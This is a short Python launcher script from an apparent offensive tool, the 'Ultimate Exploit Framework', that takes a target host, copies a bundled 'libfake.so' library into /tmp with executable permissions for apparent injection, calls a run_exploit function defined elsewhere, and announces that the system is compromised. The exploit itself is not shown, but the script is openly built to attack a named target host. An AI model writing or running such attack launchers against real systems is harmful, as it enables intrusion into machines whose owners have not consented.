import sys
import os
import shutil
from .core_secure import run_exploit

def main():
    print("[+] Loading Ultimate Exploit Framework...")
    print("[+] Made by Abolfazl Soleimani")
    
    if len(sys.argv) < 2:
        print("Usage: hacker_king_sog <target_host>")
        sys.exit(1)
    
    target = sys.argv[1]
    print(f"[*] Attacking {target}...")
    
    # مسیر libfake.so را در کنار بسته پیدا کن
    package_dir = os.path.dirname(__file__)
    src = os.path.join(package_dir, "libfake.so")
    dst = "/tmp/libfake.so"
    
    if os.path.exists(src):
        shutil.copy(src, dst)
        os.chmod(dst, 0o755)
        print("[*] libfake.so copied to /tmp")
    else:
        print("[!] libfake.so not found. Injection may fail.")
    
    result = run_exploit(target)
    if result == 0:
        print("[+] Exploit completed. System compromised.")
        print("[+] Check /tmp/.sog_pwn for proof.")
    else:
        print("[-] Exploit failed.")
